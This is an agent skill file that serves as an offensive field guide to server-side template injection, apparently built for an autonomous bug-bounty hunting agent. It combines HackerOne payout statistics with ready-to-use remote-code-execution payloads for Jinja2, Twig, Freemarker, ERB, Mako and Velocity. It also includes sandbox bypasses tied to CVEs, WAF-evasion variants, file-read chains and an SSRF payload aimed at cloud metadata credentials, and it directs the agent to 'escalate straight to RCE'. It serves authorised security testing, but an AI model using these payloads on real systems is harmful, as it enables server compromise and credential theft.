# Upstream source: ssti (hunting)

Original path: `/tmp/h1res_MrPsycho04_Hunting-Agent/ssti/SKILL.md`

---

---
name: ssti
description: >-
  Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker
  (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and
  dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via
  the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed
  reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode.
  Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use
  when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints
  that compose strings with user input before render. Combined with the HackerOne field guide (real
  disclosed-report data: where it pays, quick wins, payload banks). Hunt SSTI. Use when user input reaches
  template engines in emails, PDFs, previews, and CMS themes. Backed by 28 disclosed HackerOne reports.
---

# SSTI — Combined Field Guide

**Merged skill.** This fuses two complementary sources into one reference:

- **Part 1 — HackerOne field guide:** statistics from disclosed reports, "where it pays," quick wins, and curated payload banks.
- **Part 2 — Bug hunter methodology:** autonomous testing priority, canary discipline, crown-jewel targeting, OOB/validation gates, and reporting guidance.

**How to use:** Open with Part 2 for execution discipline (set your canary, know your success/failure gate). Use Part 1 to prioritize targets and pull payloads. Before reporting, run the validation gates in both parts.

---

<!-- ============ PART 1: HACKERONE FIELD GUIDE (data + payloads) ============ -->

# Server-Side Template Injection (SSTI) — HackerOne field guide

Built from **28** publicly disclosed HackerOne reports (2016–2026). Corpus: `~/.local/share/hackerone-reports/`.

**Reference files (load on demand):**

- `references/payloads.md` — payload banks, probes, wordlists, Nuclei templates, observed parameters
- `references/techniques.md` — quick wins, bypasses, real-report techniques, deeper checklists

## Signal

- Reports: **28** · paid: **6**
- Median bounty **$2,150** · p90 **$10,000** · max **$10,000** · total **$18,550**
- Median upvotes **26**

## Where it pays

| Program | Reports | Bounty | Upvotes |
|---|---|---|---|
| Uber | 2 | $13,000 | 172 |
| GitHub Security Lab | 4 | $2,300 | 54 |
| Mail.ru | 2 | $2,000 | 166 |
| Shopify | 2 | $1,000 | 440 |
| Nextcloud | 1 | $250 | 17 |
| GitHub | 2 | $0 | 141 |
| WordPress | 2 | $0 | 41 |
| Unikrn | 1 | $0 | 122 |

## Where to look

Parameters, endpoints, and fields that commonly carry this bug:

`template` `name` `message` `email` `subject` `preview` `report` `theme`

## Tools

`tplmap` · `SSTImap` · `Burp` · `interactsh`

## Escalation chains

- SSTI -> RCE.
- SSTI -> file read -> creds.

## Related

- `rce` (1,399 reports)
- `xss` (2,569 reports)

## Reporting bar

- Prove real impact on a second controlled account or a safe callback.
- Keep the PoC minimal and reproducible; include raw requests and exact IDs.
- Stay inside program scope and follow disclosure rules.

---

<!-- ============ PART 2: BUG HUNTER METHODOLOGY (execution + validation) ============ -->

## Autonomous Testing Priority

**Escalate straight to RCE — don't stop at arithmetic detection.**

Arithmetic probes (`{{7*7}}→49`) confirm the injection point but are not proof of impact. The real goal is OS command execution. Arithmetic detection also fails silently when the app echoes the input back (e.g. inside an HTML attribute like `<input value="{{7*7}}">`), producing a false negative even when injection exists.

**Order of attack:**
1. **Try Jinja2 RCE first** (covers Python/Flask — the most common stack in modern web apps):
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. **If the endpoint is a traditional web form**, send as form-encoded body — NOT JSON:
   ```
   Content-Type: application/x-www-form-urlencoded
   field={{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
   JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing).
3. **If Jinja2 fails**, try Twig (PHP/Symfony): `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
4. **Fall back to arithmetic detection** only to fingerprint the engine when RCE payloads fail.

**Proof:** Command output (`uid=N(user) gid=...`) in the response confirms RCE. If the output appears in HTML (inside a `<div>` or `<pre>`), that still counts — the format is irrelevant, the content is the evidence.

---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity / Mako (all use ${...})
<%= 7*7 %>       → 49 = ERB (Ruby)
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (Python string repetition); 49 = Twig (numeric coercion of '7'). Differentiates Jinja2 from Twig.
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Length-constrained injection fields (profile name, display name, subject)
When the injectable field caps input length (a profile-name / display-name field is often ≤30-64 chars), the full `os.popen` one-liner won't fit — but detection and class-enumeration still do. Confirm with the short probe, then enumerate the gadget index in stages instead of one payload:
```python
{{ '7'*7 }}                                  # detection, fits anywhere
{{ [].__class__.__base__.__subclasses__() }} # dump class list, pick the index for subprocess.Popen/os
{{ ''.__class__.__mro__[1].__subclasses__()[INDEX]('id',shell=True,stdout=-1).communicate() }}
```
The reflected sink is frequently an **outbound email** (the account-update / confirmation mail rendering your name), not the web page — read the email body for the evaluated output. Disclosed: reports/125980 (profile-name → Jinja2 → confirmation email, length-limited).

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

### CMS / "documentation" template-editor forms (authenticated)

Some SSTI lives behind a logged-in template editor (CMS "edit template" / product-template / email-template
preview). PortSwigger's *"SSTI using documentation"* class is this shape. Three things break a naive attempt:

1. **Fingerprint BEFORE firing RCE — the engine decides the syntax.** Do NOT assume Jinja2. Probe the
   whole matrix and read which one evaluates:
   ```
   ${7*7}  → 49  AND  #{7*7} → 49   ⇒ Freemarker (Java)   ← {{7*7}} does NOTHING here
   {{7*7}} → 49                      ⇒ Jinja2 / Twig
   <%= 7*7 %> → 49                   ⇒ ERB (Ruby)
   *{7*7}  → 49                      ⇒ Thymeleaf (Spring)
   ```
   If `{{7*7}}` renders literally but `${7*7}`→49, you are on **Freemarker** — stop sending `{{config...}}`.

2. **The record id is usually a QUERY param, not a body field.** The editor form posts back to
   `POST /…/template?productId=N` with the id in the URL. The BODY carries only
   `csrf`, `template`, and a `template-action` (`preview` | `save`). Putting the id in the body returns
   `400 "Missing product id"`. So keep the id in the query string (`?productId=N`) AND send a
   form-encoded body of `csrf=…&template=<PAYLOAD>&template-action=preview`.

3. **Re-fetch the CSRF each time and use `preview` to iterate.** GET the editor page to read a *fresh*
   `csrf` hidden field; `template-action=preview` renders your payload WITHOUT persisting (fast feedback
   loop). Switch to `template-action=save` only once the payload is right, then trigger the render
   (load the public page that uses the template) to fire the command.

   **Freemarker documentation RCE** (the documented `Execute` utility — this IS the intended technique):
   ```
   <#assign ex="freemarker.template.utility.Execute"?new()>${ ex("id") }
   ```
   Velocity equivalent: `#set($e="e");$e.getClass().forName("java.lang.Runtime")...`.

---

## Related Skills & Chains

- **`rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.

---

## Web-Research Methodology Additions (2026)

### A. Discovery checklist — concrete places, params, headers, file types to look
- Treat any field whose value is re-rendered through a template as a candidate: `name`, `message`, `subject`, `email`, `preview`, `theme`, `description`, `bio`, invoice/product name, PDF/report title, and CMS "edit template" bodies.
- Highest-yield sinks are stored-and-rendered surfaces, not just the immediate HTTP response: outbound email templates (profile name rendered into a confirmation mail), invoice/PDF generators, "documentation"/template-editor preview forms, and admin CMS template editors.
- Probe the full syntax matrix at each candidate — a single-engine probe silently misses polyglot-capable sinks. Send `{{7*7}}`, `${7*7}`, `#{7*7}`, `<%= 7*7 %>`, `*{7*7}`, `@(7*7)` (Razor), `{php}echo 7*7;{/php}` (Smarty).
- Code-context probing: when input lands *inside* an expression, break out — e.g. `greeting=data.username}}<tag>` — and look for the literal tag rendered alongside the value.
- Fingerprint with the all-syntax fuzz string ` ${{<%[%'"}}%\ `; the resulting error text commonly names Handlebars, Jinja2, Twig, or Freemarker (PortSwigger "unknown language" lab pattern).
- The "SSTI using documentation" class lives behind authenticated template editors — enumerate CMS/admin routes, not only public forms. A record id is usually a query param (`?productId=N`) while the body carries `csrf`, `template`, and `template-action=preview|save`.
- Enumerate in-scope engine/environment objects: `${T(java.lang.System).getenv()}` (Java), `{{config}}` (Flask/Jinja2 — leaks `SECRET_KEY`), `_self` (Twig 1.x), `product` (Freemarker labs). Non-standard developer-supplied objects are the softest target in a sandbox.
- New 2025-2026 surface: LLM/agent "text processing"/"script"/prompt-template configuration fields. RAGFlow GHSA-vvwj-fvwh-4whx (2026) used unsandboxed `jinja2.Template` on a user-set Script field → OS command execution.
- Check export/report/screenshot endpoints and email-queue previews, where the rendered output is delayed or delivered to a different channel.

### B. Techniques & bypasses — specific actionable techniques/payload shapes
- Error-based blind SSTI: PortSwigger's #1 technique of 2025 ("Successful Errors: New Code Injection and SSTI Techniques") adapts SQL-style boolean/time error oracles to template expressions, letting you exfiltrate evaluated output with conditional error triggering and no time delays. Use polyglot probes to detect the class comprehensively.
- Quote-free, plugin-free RCE (Brumens / YesWeHack, Ekoparty 2024): build strings from engine globals instead of literals — Jinja2 `{{ self.__init__.__globals__.__str__()[1786:1788] }}` slices `"id"` out of the globals string; fire via `os.popen(str().join(chr(i) for i in [105,100])).read()`. Twig uses `block` + the built-in `_charset` variable.
- Jinja2 class-walker ladder, in order: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` → `{{ cycler.__init__.__globals__.os.popen('id').read() }}` → `{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`; when dunder attributes are blocked, enumerate `''.__class__.__mro__[1].__subclasses__()` and hunt the `subprocess.Popen` index.
- Twig 1.x: `{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}`. Twig 2+ removed `_self` env access — pivot to `{{ ['id']|map('system')|join(',') }}`, an exposed evaluator helper, or a sandbox bypass.
- Concrete 2025 Grav sandbox-bypass shapes: `{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}{% set a = grav.config.set('system.twig.undefined_functions',false) %}{{ grav.twig.twig.getFunction('id') }}` (CVE-2025-66294); whitelist poisoning via `{{ grav.twig.twig_vars['config'].set('system.twig.safe_filters', {'1':'system'}) }}{{ 'id'|system }}` (CVE-2025-66299). Weak regex cleaners that blacklist `call_user_func`/`read_file`/`undefined_functions` can be defeated by nesting the forbidden token inside its own replacement marker.
- Freemarker: `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`; in a sandbox where `?new()` is denied, read a file via the object chain `${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}` and decode the decimal bytes.
- Mako native block: `<% import os; x=os.popen('id').read() %>${x}`. ERB: `<%= Dir.entries('/') %>` and `<%= File.open('/etc/passwd').read %>`. Velocity: `$class.inspect("java.lang.Runtime").type.getRuntime().exec("id")`. Handlebars: constructor-access `{{#with "s" as |string|}}...` chain from the PortSwigger lab.
- If runtime access is impossible, do not discard the finding: template engines often expose URL fetchers/filters first (SSRF via a `include()`/fetch filter), and unrendered output often yields stored XSS or path traversal.
- Sandbox discipline: `SandboxedEnvironment`/`ImmutableSandboxedEnvironment` genuinely blocks the classic dunder walk, but it is not absolute — look for developer-supplied objects, unsafe custom filters, and version-specific escapes rather than assuming the sandbox ends the test.

### C. Validation / proof bar — how to confirm and avoid false positives
- Arithmetic reflection (`{{7*7}} → 49`) is detection, not impact. Claim Critical only after command output (`uid=...`) or a unique Collaborator/interactsh callback fired from inside the evaluated payload.
- A payload echoed literally (HTML-escaped, or inside an attribute) is a false positive. Confirm evaluation in the real sink — the email body, exported PDF, or preview pane — not merely the immediate response.
- Differentiate engines with at least two probes: `{{7*'7'}}` returns `7777777` on Jinja2 but `49` on Twig; `${7*7}`+`#{7*7}` together indicate Freemarker.
- Sandboxed/expression-only evaluation with no runtime access is Medium SSTI, not Critical RCE. Prove file read or command execution before raising severity.
- Respect content type: JSON bodies are silently ignored by form-processing endpoints (`request.form['field']` sees nothing) — replay as `application/x-www-form-urlencoded`.
- Re-fetch CSRF for each iteration; use `template-action=preview` to iterate without persisting, then `save` and trigger the public render only once the payload is correct.
- Reproduce verbatim twice and retain the raw request/response showing the exact field, content type, and evaluated output.

**Engine-discriminator matrix (record which probes actually evaluate):**
- `{{7*7}} → 49` — Jinja2, Twig, Smarty (`{php}` variant), Nunjucks.
- `{{7*'7'}} → 7777777` — Jinja2 string repetition; `49` — Twig numeric coercion.
- `${7*7} → 49` and `#{7*7} → 49` — Freemarker (Java); `{{7*7}}` does nothing here.
- `<%= 7*7 %> → 49` — ERB (Ruby). `*{7*7} → 49` — Thymeleaf (Spring).
- `@(7*7) → 49` — Razor (.NET). `#set($x=7*7)$x → 49` — Velocity.
- Error text naming `Handlebars`, `Freemarker`, `Twig`, or a Java stack trace is a strong engine ID even when math probes fail.

**Common false-positive patterns to actively rule out:**
- The app HTML-escapes `{{7*7}}` and shows it literally — template syntax is being treated as data.
- A WAF 403 on `{{` or `${` is a filter hit, not evaluation; try the alternative delimiters and encoded/unicode variants.
- A blank response after an RCE payload usually means an exception was thrown, not that the command ran — look for the command output or use an OOB callback.
- Output that appears only in a *different* channel (email, PDF, log) is still real SSTI; failure to see it in the HTTP response is not a false negative if you can read that channel.
- Arithmetic evaluation inside a sandbox (e.g., Twig sandbox mode, Jinja2 `SandboxedEnvironment` with no escape) is Medium SSTI, never Critical RCE.

**Severity decision discipline:**
- Unauthenticated template-editor access or a public form reaching unsandboxed Jinja2/Freemarker/Twig → Critical RCE.
- Authenticated editor reaching RCE (CMS admin, LLM agent config) → High; still report if the privilege boundary is weaker than intended (e.g., any editor, not just admin).
- Sandboxed engine with confirmed file read → High; expression evaluation only → Medium.
- Template-name/include control (input chooses which template file to load) → treat as LFI/path traversal and test with `../../etc/passwd` rather than arithmetic probes.
- When reporting, include the engine name, the exact field and content type, the fingerprint probes, and the final RCE/file-read evidence as separate steps — this is the documented PortSwigger exploitation workflow (Read → Explore → Create a custom attack).
- Remember the OWASP caveat: auto-escaping prevents XSS in printed values but does not prevent SSTI, because escaping applies to values the engine prints, not to template code it has already parsed — do not dismiss a sink because output is HTML-escaped.

### D. Sources — numbered list of URLs you actually fetched
1. https://portswigger.net/web-security/server-side-template-injection/exploiting
2. https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html
3. https://portswigger.net/research/top-10-web-hacking-techniques-of-2025
